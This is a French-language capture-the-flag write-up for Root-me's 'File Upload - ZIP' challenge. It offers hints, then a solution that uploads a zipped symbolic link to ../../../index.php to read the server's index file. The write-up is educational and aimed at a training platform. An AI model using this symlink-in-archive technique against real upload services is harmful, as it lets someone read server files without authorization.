---
title: Root-me - Web Server - File Upload - ZIP
meta_title: ""
description: Récupérer la page index.php.
date: 2024-16-07T05:00:00Z
image: /images/rootme_logo.png
categories:
  - Web
  - Moyen
author: Emma.exe
tags:
  - Web
  - Rootme
draft: false
---

## Introduction

Dans ce challenge, nous devons récupérer l'index.php qui contient le flag grâce à l'upload d'un fichier.

Ce fichier va ensuite être zippé et décompressé.

Pour la résolution de ce challenge je vous propose deux niveaux d'aide :

- Le premier niveau sous la forme d'indices et de ressources à explorer pour résoudre le challenge, sans pour autant donner la solution
- Le deuxième niveau qui présente un exemple de résolution.

{{< notice "tip" >}} Essayez de ne pas regarder la solution si vous voulez vraiment progresser. Une fois le challenge résolu, il peut être intéressant de la regarder pour apprendre de nouvelles techniques ! {{< /notice >}}

## Résolution
{{< tabs >}} {{< tab "Niveau 1" >}}

Afin de résoudre ce challenge, je vous conseille d'effectuer une veille sur les différentes attaques possibles sur les file upload en lien avec des fichiers ZIP.

Je vous conseille aussi de regarder le fonctionnement d'une LFI (Local File Inclusion). Il s'agit d'une vulnérabilité permettant de récupérer un fichier local.

Ressource : https://book.hacktricks.xyz/pentesting-web/file-inclusion

{{< /tab >}}

{{< tab "Niveau 2" >}}
En effectuant une veille, on trouve rapidement cette documentation : https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack/

Cela explique que l'on peut faire une LFI avec des liens symboliques de la façon suivante : 

1. Création du lien symbolique de index.php situé plus haut (3 étages plus haut): 
```sh
ln -s ../../../index.php index.txt
```

2. On zip avec l'option `--symlink` afin de conserver les liens symboliques :
```sh
zip --symlink rce.zip index.txt
```

3. Upload de rce.zip et accéder à l'URL : 
```
http://challenge01.root-me.org/web-serveur/ch51/tmp/upload/668d41125f3e61.78612596/index.txt
```

On obtient normalement la page index.php qui contient le flag.

{{< /tab >}} {{< /tabs >}}
